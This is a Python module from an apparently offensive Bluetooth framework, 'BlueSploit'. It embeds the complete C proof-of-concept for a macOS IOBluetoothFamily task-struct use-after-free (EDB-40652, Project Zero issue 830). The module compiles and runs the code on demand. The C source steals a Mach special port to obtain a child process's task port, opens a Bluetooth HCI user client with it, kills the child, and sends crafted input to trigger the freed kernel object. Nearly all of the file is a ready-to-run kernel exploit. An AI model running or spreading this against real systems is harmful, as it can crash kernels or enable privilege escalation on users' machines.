"""
BlueSploit Module: macOS IOBluetoothFamily Task-Struct UAF
EDB-ID: 40652  (Project Zero issue 830, ianbeer)
OS X 10.11.5

Original C PoC embedded verbatim, compiled and executed at runtime.
The C source includes the parent/child Mach port-dancer required to
pass the child's task port as `owningTask`.
"""

from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import print_error, print_info, print_warning, Colors
from core.utils.c_runner import compile_and_run, find_compiler
from core.utils.iokit import is_macos


C_SOURCE = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <libkern/OSAtomic.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>
#include <mach/task.h>
#include <mach/task_special_ports.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

#define MACH_ERR(str, err) do { if (err != KERN_SUCCESS) { mach_error("[-]" str "\n", err); exit(EXIT_FAILURE); } } while(0)
#define FAIL(str) do { printf("[-] " str "\n"); exit(EXIT_FAILURE); } while (0)
#define LOG(str) do { printf("[+] " str"\n"); } while (0)

typedef struct { mach_msg_header_t header; mach_msg_body_t body; mach_msg_port_descriptor_t port; } port_msg_send_t;
typedef struct { mach_msg_header_t header; mach_msg_body_t body; mach_msg_port_descriptor_t port; mach_msg_trailer_t trailer; } port_msg_rcv_t;
typedef struct { mach_msg_header_t header; } simple_msg_send_t;
typedef struct { mach_msg_header_t header; mach_msg_trailer_t trailer; } simple_msg_rcv_t;

#define STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT
mach_port_t saved_special_port = MACH_PORT_NULL;
mach_port_t shared_port_parent = MACH_PORT_NULL;

void setup_shared_port(void) {
  kern_return_t err;
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &saved_special_port);
  MACH_ERR("save", err);
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &shared_port_parent);
  MACH_ERR("alloc", err);
  err = mach_port_insert_right(mach_task_self(), shared_port_parent, shared_port_parent, MACH_MSG_TYPE_MAKE_SEND);
  MACH_ERR("insert", err);
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);
  MACH_ERR("set", err);
}

mach_port_t recover_shared_port_child(void) {
  kern_return_t err;
  mach_port_t shared = MACH_PORT_NULL;
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &shared);
  MACH_ERR("get", err);
  mach_port_t reply;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply);
  MACH_ERR("alloc reply", err);
  simple_msg_send_t m = {0};
  m.header.msgh_size = sizeof(m);
  m.header.msgh_local_port = reply;
  m.header.msgh_remote_port = shared;
  m.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
  err = mach_msg_send(&m.header);
  MACH_ERR("send", err);
  port_msg_rcv_t rm = {0};
  err = mach_msg(&rm.header, MACH_RCV_MSG, 0, sizeof(rm), reply, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("rcv", err);
  mach_port_t st = rm.port.name;
  if (st == MACH_PORT_NULL) FAIL("invalid stolen");
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, st);
  MACH_ERR("restore", err);
  return shared;
}

mach_port_t recover_shared_port_parent(void) {
  kern_return_t err;
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);
  MACH_ERR("restore", err);
  simple_msg_rcv_t m = {0};
  err = mach_msg(&m.header, MACH_RCV_MSG, 0, sizeof(m), shared_port_parent, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("rcv", err);
  port_msg_send_t sm = {0};
  sm.header.msgh_size = sizeof(sm);
  sm.header.msgh_local_port = MACH_PORT_NULL;
  sm.header.msgh_remote_port = m.header.msgh_remote_port;
  sm.header.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(m.header.msgh_bits), 0) | MACH_MSGH_BITS_COMPLEX;
  sm.body.msgh_descriptor_count = 1;
  sm.port.name = saved_special_port;
  sm.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  sm.port.type = MACH_MSG_PORT_DESCRIPTOR;
  err = mach_msg_send(&sm.header);
  MACH_ERR("send", err);
  return shared_port_parent;
}

void do_child(mach_port_t shared) {
  kern_return_t err;
  mach_port_t reply;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply);
  MACH_ERR("alloc", err);
  port_msg_send_t m = {0};
  m.header.msgh_size = sizeof(m);
  m.header.msgh_local_port = reply;
  m.header.msgh_remote_port = shared;
  m.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
  m.body.msgh_descriptor_count = 1;
  m.port.name = mach_task_self();
  m.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  m.port.type = MACH_MSG_PORT_DESCRIPTOR;
  err = mach_msg_send(&m.header);
  MACH_ERR("send", err);
  while(1){;}
}

mach_port_t do_parent(mach_port_t shared) {
  kern_return_t err;
  port_msg_rcv_t m = {0};
  err = mach_msg(&m.header, MACH_RCV_MSG, 0, sizeof(m), shared, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("rcv", err);
  mach_port_t cp = m.port.name;
  if (cp == MACH_PORT_NULL) FAIL("invalid child");
  return cp;
}

io_connect_t get_connection(mach_port_t task_port) {
  kern_return_t err;
  mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOBluetoothHCIController"));
  if (service == MACH_PORT_NULL) return MACH_PORT_NULL;
  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, task_port, 0, &conn);
  IOObjectRelease(service);
  if (err != KERN_SUCCESS) return MACH_PORT_NULL;
  return conn;
}

void trigger(int child_pid, mach_port_t child_task_port) {
  kern_return_t err;
  io_connect_t conn = get_connection(child_task_port);
  if (conn == MACH_PORT_NULL) { printf("no conn\n"); return; }
  printf("got user client\n");
  mach_port_deallocate(mach_task_self(), child_task_port);
  kill(child_pid, 9);
  int status; wait(&status);
  printf("killed child\n");
  char struct_input[0x74] = {0};
  struct_input[0x38] = 0x80;
  *(uint64_t*)(&struct_input[0]) = 0x414141414141;
  err = IOConnectCallMethod(conn, 0, NULL, 0, struct_input, 0x74, NULL, NULL, NULL, NULL);
  MACH_ERR("call", err);
}

int main(void) {
  setup_shared_port();
  pid_t child_pid = fork();
  if (child_pid == -1) FAIL("fork");
  if (child_pid == 0) { mach_port_t s = recover_shared_port_child(); do_child(s); }
  else { mach_port_t s = recover_shared_port_parent(); mach_port_t c = do_parent(s); trigger(child_pid, c); }
  return 0;
}
"""


class Module(DosModule):
    info = ModuleInfo(
        name="dos/macos_iobt_uaf",
        description="macOS IOBluetoothHCIUserClient task-struct UAF (EDB-40652, native C)",
        author=["ianbeer (Project Zero)"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=[
            "https://www.exploit-db.com/exploits/40652",
            "https://bugs.chromium.org/p/project-zero/issues/detail?id=830",
        ],
    )

    def _setup_options(self) -> None:
        self.options = {}

    def run(self) -> bool:
        C = Colors
        print(f"\n  {C.RED}{'─'*55}{C.RESET}")
        print(f"  {C.BOLD}macOS IOBluetoothFamily UAF (EDB-40652){C.RESET}")
        print(f"  {C.RED}{'─'*55}{C.RESET}")
        if not is_macos():
            print_error("macOS only, needs Mach IPC + IOKit")
            return False
        if not find_compiler():
            print_error("No C compiler, install Xcode CLI tools")
            return False
        print_warning("Spawns child + sends fake task port + triggers UAF")

        rc, out, err = compile_and_run(
            C_SOURCE, "iobt_uaf",
            ldflags=["-framework", "IOKit", "-framework", "CoreFoundation"],
        )
        if rc == -1:
            print_error(err.strip())
            return False
        print_info(out)
        if err.strip():
            print_warning(err.strip())
        self.add_result({"edb_id": 40652, "rc": rc})
        return rc == 0
